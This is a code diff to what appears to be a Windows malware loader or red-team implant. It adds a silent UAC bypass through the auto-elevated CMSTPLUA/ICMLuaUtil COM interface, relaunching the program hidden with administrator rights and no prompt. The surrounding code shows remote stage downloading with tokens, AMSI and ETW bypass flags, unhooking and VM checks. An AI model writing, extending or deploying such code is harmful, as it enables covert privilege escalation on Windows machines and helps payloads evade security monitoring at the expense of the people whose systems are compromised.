@@ -19,6 +19,7 @@
 #include <shellapi.h>
 #include <bcrypt.h>
 #include <winhttp.h>
+#include <objbase.h>
 #include <intrin.h>
 #include <string>
 #include <vector>
@@ -31,6 +32,7 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "ole32.lib")
 
 // Legacy VXPAY002 (XOR) stage blobs: off by default. Only a transitional
 // deployment that still serves an old stage.bin should enable this.
@@ -909,19 +911,82 @@ static bool IsElevated() {
     return out;
 }
 
-static bool RelaunchElevated() {
+static std::wstring CommandTail() {
+    const wchar_t* cmd = GetCommandLineW();
+    if (!cmd) return L"";
+    const wchar_t* p = cmd;
+    if (*p == L'"') { p++; while (*p && *p != L'"') p++; if (*p) p++; }
+    else { while (*p && *p != L' ') p++; }
+    while (*p == L' ') p++;
+    return p;
+}
+
+// UACME #67: auto-elevated CMSTPLUA/ICMLuaUtil. Silent under default UAC,
+// no registry write, no INF drop. The child signals a named event only after
+// it confirms the admin token, so a failed elevation cannot recurse.
+static bool RelaunchElevatedSilent(const std::wstring& args) {
     wchar_t self[MAX_PATH]{};
     if (!GetModuleFileNameW(NULL, self, MAX_PATH)) return false;
 
-    std::wstring args;
-    const wchar_t* cmd = GetCommandLineW();
-    if (cmd) {
-        // Skip argv[0] (quoted or not) and keep the rest verbatim.
-        const wchar_t* p = cmd;
-        if (*p == L'"') { p++; while (*p && *p != L'"') p++; if (*p) p++; }
-        else { while (*p && *p != L' ') p++; }
-        args = p;
+    const CLSID clsid = { 0x3E5FC7F9, 0x9A51, 0x4367,
+        { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 } };
+    const IID iid = { 0x6EDD6D74, 0xC007, 0x4E75,
+        { 0xB7, 0x6A, 0xE5, 0x14, 0x8D, 0x4B, 0x4C, 0x2E } };
+    struct ICMLuaUtil : public IUnknown {
+        virtual HRESULT STDMETHODCALLTYPE ShellExec(
+            LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory,
+            ULONG fMask, ULONG nShow) = 0;
+    };
+
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    bool uninit = SUCCEEDED(hr);
+    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return false;
+
+    wchar_t guid[64]{};
+    if (!StringFromGUID2(clsid, guid, 64)) {
+        if (uninit) CoUninitialize();
+        return false;
     }
+    std::wstring moniker = L"Elevation:Administrator!new:" + std::wstring(guid);
+    IUnknown* unknown = nullptr;
+    hr = CoGetObject(moniker.c_str(), NULL, IID_IUnknown, (void**)&unknown);
+    if (FAILED(hr) || !unknown) {
+        if (uninit) CoUninitialize();
+        return false;
+    }
+    ICMLuaUtil* util = nullptr;
+    hr = unknown->QueryInterface(iid, (void**)&util);
+    unknown->Release();
+    if (FAILED(hr) || !util) {
+        if (uninit) CoUninitialize();
+        return false;
+    }
+
+    std::wstring evt = L"Local\\vxl" +
+        std::to_wstring(GetCurrentProcessId()) + L"_" +
+        std::to_wstring((unsigned long long)GetTickCount64());
+    HANDLE event = CreateEventW(NULL, TRUE, FALSE, evt.c_str());
+    if (!event) {
+        util->Release();
+        if (uninit) CoUninitialize();
+        return false;
+    }
+    std::wstring cmd = L"\"" + std::wstring(self) + L"\" --uac-event \"" +
+        evt + L"\"";
+    if (!args.empty()) cmd += L" " + args;
+    hr = util->ShellExec(cmd.c_str(), NULL, NULL, 0, SW_HIDE);
+    bool ok = SUCCEEDED(hr) &&
+        WaitForSingleObject(event, 10000) == WAIT_OBJECT_0;
+    CloseHandle(event);
+    util->Release();
+    if (uninit) CoUninitialize();
+    return ok;
+}
+
+static bool RelaunchElevated() {
+    wchar_t self[MAX_PATH]{};
+    if (!GetModuleFileNameW(NULL, self, MAX_PATH)) return false;
+    std::wstring args = CommandTail();
 
     SHELLEXECUTEINFOW sei{ sizeof(sei) };
     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -939,7 +1004,7 @@ static bool RelaunchElevated() {
 // ---------------------------------------------------------------------------
 int wmain(int argc, wchar_t** argv) {
     std::wstring payloadPath;
-    std::wstring stageUrl, stageToken, stageTokenFile;
+    std::wstring stageUrl, stageToken, stageTokenFile, uacEvent;
     bool inspect = false, doAmsi = true, doEtw = true, doUnhook = true;
     bool elevate = true, vmCheck = false;
 
@@ -956,6 +1021,7 @@ int wmain(int argc, wchar_t** argv) {
         else if (a == L"--stage" && i + 1 < argc) stageUrl = argv[++i];
         else if (a == L"--token" && i + 1 < argc) stageToken = argv[++i];
         else if (a == L"--token-file" && i + 1 < argc) stageTokenFile = argv[++i];
+        else if (a == L"--uac-event" && i + 1 < argc) uacEvent = argv[++i];
     }
     if (stageToken.empty() && !stageTokenFile.empty()) {
         std::ifstream tf(stageTokenFile.c_str());
@@ -970,10 +1036,19 @@ int wmain(int argc, wchar_t** argv) {
     }
 
     if (elevate && !inspect && !IsElevated()) {
+        if (!uacEvent.empty()) return 2;   // failed child: do not recurse
         VLog("[*] requesting elevation");
+        std::wstring tail = CommandTail();
+        if (RelaunchElevatedSilent(tail)) return 0;
         if (RelaunchElevated()) return 0;
         VLog("[!] elevation failed");
         return 2;
+    }
+
+    // Signal the waiting parent only after the admin token is confirmed.
+    if (!uacEvent.empty() && IsElevated()) {
+        HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, uacEvent.c_str());
+        if (ev) { SetEvent(ev); CloseHandle(ev); }
     }
 
     // Hide the console only when Windows created one for this process. Running
